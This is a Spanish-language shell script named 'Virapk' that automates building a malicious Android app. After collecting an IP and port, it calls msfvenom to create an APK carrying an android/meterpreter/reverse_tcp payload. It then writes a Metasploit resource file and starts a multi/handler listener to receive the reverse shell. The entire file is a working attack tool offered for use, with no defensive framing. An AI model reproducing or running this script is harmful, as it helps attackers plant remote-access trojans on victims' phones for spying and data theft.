#!/system/bin/sh

clear

echo -e "\e[31m"
figlet "               Virapk"
echo ""
read -p "Decime tu nombre por favor ==> " hola
clear
figlet "        Bienvenido  "
figlet "          $hola     "

# Función para validar la IP
validate_ip() {
    local ip=$1
    if [[ $ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        return 0 # IP válida
    else
        return 1 # IP inválida
    fi
}

# Función para validar el puerto
validate_port() {
    local port=$1
    if [[ $port =~ ^[0-9]+$ && $port -ge 1 && $port -le 65535 ]]; then
        return 0 # Puerto válido
    else
        return 1 # Puerto inválido
    fi
}

# Solicitar y validar la IP
while true; do
    read -p "Ingrese la IP por favor ==> " IP
    if ! validate_ip "$IP"; then
        echo "La IP ingresada no es válida. Por favor, ingrese una IP válida."
    else
        break
    fi
done

# Solicitar y validar el puerto
while true; do
    read -p "Ingrese el puerto por favor ==> " PUERTO
    if ! validate_port "$PUERTO"; then
        echo "El puerto ingresado no es válido. Por favor, ingrese un puerto válido."
    else
        break
    fi
done

echo "IP y puerto válidos"

# Resto del script para generar el payload y ejecutar Metasploit
read -p "Nombre del Payload ==> " name
nombre="$name.apk"  # Nombre predeterminado del payload, puedes cambiarlo si deseas
echo "Generando el payload..."
msfvenom -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$PUERTO -o $nombre
echo "Payload generado: $nombre"
echo "Iniciando msfconsole..."
sleep 1

# Ejecutar Metasploit en modo batch
echo "use exploit/multi/handler" > msfcommands.rc
echo "set PAYLOAD android/meterpreter/reverse_tcp" >> msfcommands.rc
echo "set LHOST $IP" >> msfcommands.rc
echo "set LPORT $PUERTO" >> msfcommands.rc
echo "exploit -j" >> msfcommands.rc
msfconsole -r msfcommands.rc

# Limpiar el archivo de comandos después de su uso
rm msfcommands.rc












